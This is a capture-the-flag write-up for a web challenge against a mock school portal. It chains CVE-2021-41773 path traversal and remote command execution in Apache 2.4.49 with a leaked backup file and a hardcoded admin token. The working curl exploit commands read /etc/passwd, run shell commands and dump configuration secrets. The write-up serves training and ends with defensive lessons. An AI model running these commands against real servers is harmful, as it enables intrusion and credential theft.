# L'Enigme du Code Apogee

![Category](https://img.shields.io/badge/Category-Web%20Exploitation-2563eb?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium%20%2F%20Hard-f59e0b?style=flat-square)
![CVE](https://img.shields.io/badge/CVE-2021--41773-dc2626?style=flat-square)
![Impact](https://img.shields.io/badge/Impact-RCE%20%2B%20Secret%20Leak-7c3aed?style=flat-square)

> Objective: compromise a fake ENSA Beni Mellal portal by chaining Apache path traversal, RCE, backup leakage and hidden admin export access.

## Executive Summary

The target exposed an Apache `2.4.49` server, immediately suggesting CVE-2021-41773. The vulnerable `/cgi-bin/` path allowed traversal and remote command execution through `/bin/sh`.

After gaining RCE as `www-data`, I enumerated `/var/www/html`, found a leaked `backup/config.bak`, recovered credentials and a hidden admin export token, then accessed the protected export endpoint to obtain the flag.

## Attack Chain

| Phase | Technique | Result |
| --- | --- | --- |
| Recon | Directory fuzzing | `admin`, `backup`, `cgi-bin` found |
| Fingerprint | Server banner review | Apache `2.4.49` identified |
| Exploit | CVE-2021-41773 | Path traversal confirmed |
| RCE | `/bin/sh` through `cgi-bin` | Command execution as `www-data` |
| Post-exploitation | Web root enumeration | `backup/config.bak` found |
| Secret discovery | Grep source files | `jury2026` token found |
| Flag access | Hidden export endpoint | Flag disclosed |

## 1. Reconnaissance

```bash
ffuf -u https://csia-ctf26-ensa-web-challenge.chals.io/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt
```

Interesting paths:

```text
admin                   [Status: 301]
backup                  [Status: 301]
cgi-bin/                [Status: 403]
```

Critical fingerprint:

```text
Apache/2.4.49 (Unix)
```

This version is associated with Apache path traversal vulnerability CVE-2021-41773.

## 2. Path Traversal and RCE

Traversal test:

```bash
curl -s --path-as-is \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

RCE test:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;id"
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE was confirmed.

## 3. Web Root Enumeration

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;ls /var/www/html"
```

Output:

```text
admin
backup
icons
index.nginx-debian.html
index.php
robots.txt
```

The `backup/` folder was the next strong lead.

## 4. Backup Leakage

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;ls /var/www/html/backup"
```

Output:

```text
config.bak
```

Read the backup:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;cat /var/www/html/backup/config.bak"
```

Leaked content:

```text
DB_USER=etudiant
DB_PASS=123456

JURY_TOKEN_HASH=5e1ed8b7f3abcb9db4c1fd18fe17b5a1
```

Base64 hint:

```text
# ZXR1ZGlhbnQ6MTIzNDU2
# base64 : etudiant:123456
```

## 5. Credential Validation

```bash
curl -i -X POST https://csia-ctf26-ensa-web-challenge.chals.io/ \
  -d "username=etudiant&password=123456"
```

Successful session:

```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
```

The account was valid but had limited privileges.

## 6. Hidden Admin Export

List admin directory:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;ls /var/www/html/admin"
```

Output:

```text
export
```

Search for token references:

```bash
curl -s --path-as-is -X POST \
  -d "echo;grep -R 'token' /var/www/html 2>/dev/null" \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

Result:

```php
/var/www/html/admin/export/grades.php:$secret_token = 'jury2026';
```

## 7. Flag Retrieval

```bash
curl "https://csia-ctf26-ensa-web-challenge.chals.io/admin/export/grades.php?token=jury2026"
```

Response:

```text
FLAG=CSIA{G00d_LuCk_4t_3NSA_BM_2026}
```

## Flag

```text
CSIA{G00d_LuCk_4t_3NSA_BM_2026}
```

## Lessons Learned

| Finding | Security lesson |
| --- | --- |
| Apache `2.4.49` exposed | Patch known vulnerable services quickly |
| `/cgi-bin/` allowed traversal | Harden path normalization and CGI exposure |
| Backup file in web root | Never deploy `.bak` secrets publicly |
| Hardcoded export token | Avoid static tokens and hidden security by obscurity |
| RCE as `www-data` | Least privilege and isolation matter |

